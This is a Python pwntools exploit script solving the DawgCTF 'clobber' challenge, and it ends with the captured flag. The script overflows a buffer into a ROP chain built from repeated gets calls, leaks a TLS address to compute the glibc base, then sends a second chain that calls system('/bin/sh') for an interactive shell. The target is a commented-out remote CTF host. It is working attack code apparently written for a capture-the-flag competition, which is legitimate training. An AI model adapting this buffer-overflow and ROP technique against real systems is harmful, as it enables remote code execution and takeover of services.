from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./clobber_patched', '''
    b *0x401064
    b *0x401074
    continue
''')

# p = remote('clobber.umbccd.net', 13373)

e = ELF("./clobber_patched")
chain1 = [
    e.plt.gets,
    e.plt.gets,
    e.plt.gets,
    e.plt.puts,
    e.sym.main,
]
p.sendline(b'a'*0x20+p64(0)+b''.join([p64(c1) for c1 in chain1]))
p.recvline()

p.sendline(b"\x01")

p.sendline(p32(0)+b'A'*4+b'B'*8)

p.sendline(b'C'*4)

p.recv(8)
tls_base_addr = u64(p.recv(6).ljust(8, b"\x00"))
log.info(f'tls base address: {hex(tls_base_addr)}')
glibc_base_addr = tls_base_addr + 0x28c0
log.info(f'glibc base address: {hex(glibc_base_addr)}')

glibc_e = ELF('./libc.so.6')
chain2 = [
    glibc_base_addr+next(glibc_e.search(asm("pop rdi; ret;"), executable=True)),
    glibc_base_addr+next(glibc_e.search(b"/bin/sh\x00")),
    glibc_base_addr+glibc_e.sym.system
]
p.sendline(b'a'*0x20+p64(0)+b''.join([p64(c2) for c2 in chain2]))

p.interactive()

# References: https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets#leaking-libc
# DawgCTF{p1v0t_4nd_cl0bb3r}